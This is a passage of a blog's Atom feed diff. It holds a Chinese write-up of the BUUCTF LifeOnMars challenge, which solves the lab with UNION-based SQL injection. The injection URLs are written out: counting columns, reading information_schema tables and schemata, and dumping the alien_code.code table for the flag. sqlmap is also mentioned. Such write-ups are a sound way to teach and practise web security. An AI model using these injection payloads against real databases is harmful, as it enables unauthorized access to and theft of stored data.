+&lt;p&gt;该 js 文件返回的是数据集，那么这里一定查询了数据库，那么就可能存在&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1zcWwlRTYlQjMlQTglRTUlODUlQTUlRTYlQkMlOEYlRTYlQjQlOUUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt; sql 注入漏洞&lt;/span&gt;。那就开始 sql 注入的流程。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/query?search=&lt;/code&gt;  如果地名输入正确，发现返回如下:&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;开始 SQL 注入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;有几个字段：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum order by 2
+查询数据库名称：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,database()
+查询数据表：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT%20group_concat(table_name)%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20=%20%27aliens%27)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;到这里就搞不出来了：然后就是&lt;/p&gt;
+&lt;h4 id=&#34;查询所有的数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询所有的数据库&#34;&gt;#&lt;/a&gt; 查询所有的数据库&lt;/h4&gt;
+&lt;p&gt;在这个查询中，information_schema.schemata 是一个 MySQL 系统表，其中包含所有数据库的信息。执行这个查询后，MySQL 将返回一个包含所有数据库名称的结果集。&lt;/p&gt;
+&lt;p&gt;这些命令和查询可以在 MySQL 命令行界面中使用，也可以在 MySQL 客户端或其他数据库工具中使用。&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEwMWE0OThjLWNlNGEtNDM2NC05Nzk5LWQ5YmRiMTkxMmY0My5ub2RlNS5idXVvai5jbjo4MS9xdWVyeT9zZWFyY2g9aGVzcGVyaWFfcGxhbnVtJTIwdW5pb24lMjBzZWxlY3QlMjAxLChTRUxFQ1QlMjBncm91cF9jb25jYXQoc2NoZW1hX25hbWUpJTIwRlJPTSUyMGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YQ==&#34;&gt;http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT group_concat(schema_name) FROM information_schema.schemata&lt;/span&gt;)&lt;/p&gt;
+&lt;p&gt;还可以：（直接用 sqlmap）：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;爆出还有一个 alien_code 这个库：（重复上个的操作）&lt;/p&gt;
+&lt;p&gt;或者可以：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接有字段名了：&lt;/p&gt;
+&lt;p&gt;没有直接给出就手打：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=amazonis_planitia%20union%20select%20group_concat(id),group_concat(code)%20from%20alien_code.code
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;完成，获得 flag&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="sql注入" />
+        <category term="信息搜集（js，网络）" />
+        <updated>2024-06-20T12:21:48.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/06/19/2018-GetShell/</id>
